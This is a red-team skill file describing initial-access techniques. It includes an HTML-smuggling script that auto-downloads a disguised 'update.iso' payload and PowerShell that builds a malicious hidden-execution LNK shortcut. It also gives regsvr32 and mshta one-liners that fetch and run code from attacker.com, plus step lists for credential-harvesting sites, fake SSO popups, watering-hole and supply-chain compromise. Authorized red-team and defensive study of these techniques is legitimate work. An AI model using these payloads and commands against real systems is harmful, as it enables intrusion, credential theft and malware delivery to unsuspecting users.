---
name: initial-access
description: Initial access methodology for authorized red team engagements. Covers phishing, payload delivery, drive-by compromise, supply chain entry points, and living-off-the-land initial access techniques.
version: 1.0.0
license: Apache-2.0
---

# Initial Access

## Phishing — Email

### Payload types (in order of detection likelihood)

```
1. Macro-enabled Office documents (.xlsm, .docm) — high detection
2. ISO/IMG containers (bypass Mark-of-the-Web) — medium detection
3. HTML smuggling — medium detection
4. LNK files — medium detection
5. PDF with embedded link — lower detection
6. QR code phishing (to mobile) — lowest detection
```

### HTML Smuggling

Deliver payload via JavaScript blob — bypasses email gateways that don't execute JS:

```html
<script>
function d() {
    var data = atob("[BASE64_PAYLOAD]");
    var blob = new Blob([data], {type: 'application/octet-stream'});
    var url = window.URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'update.iso';
    a.click();
}
</script>
<body onload="d()">
```

### LNK Payload

```powershell
# Create malicious LNK
$lnk = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:TEMP\Update.lnk")
$lnk.TargetPath = "C:\Windows\System32\cmd.exe"
$lnk.Arguments = "/c powershell -w hidden -ep bypass -c [payload]"
$lnk.IconLocation = "C:\Windows\System32\shell32.dll,3"
$lnk.Save()
```

## Phishing — Web (Drive-by)

```
Credential harvesting site:
1. Clone target's login page (SET / evilginx2)
2. Send link via spearphishing
3. Harvest credentials in real time

Browser-in-the-Browser (BitB):
1. Overlay a fake browser popup simulating SSO login
2. Capture credentials before they reach the real SSO provider
```

## Watering Hole

1. Identify websites frequently visited by target employees (industry forums, tools, regional news)
2. Compromise one of those sites
3. Inject exploit code or credential-harvesting redirect
4. Wait for target employees to visit

## Supply Chain Entry

```
1. Compromise a software vendor used by the target
2. Inject payload into software update
3. Target deploys "legitimate" update
4. Payload executes with software's privileges
```

## Initial Execution (post-delivery)

```powershell
# Macro-free execution via PowerShell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand [BASE64]

# Regsvr32 (squiblydoo)
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

# MSHTA
mshta http://attacker.com/payload.hta
```

## Tools

- [GoPhish](https://github.com/gophish/gophish) — phishing campaign management
- [Evilginx2](https://github.com/kgretzky/evilginx2) — adversary-in-the-middle phishing
- [msfvenom](https://metasploit.com) — payload generation
- [Donut](https://github.com/TheWover/donut) — shellcode generation from .NET

## MITRE ATT&CK

- T1566 — Phishing
- T1189 — Drive-by Compromise
- T1195 — Supply Chain Compromise
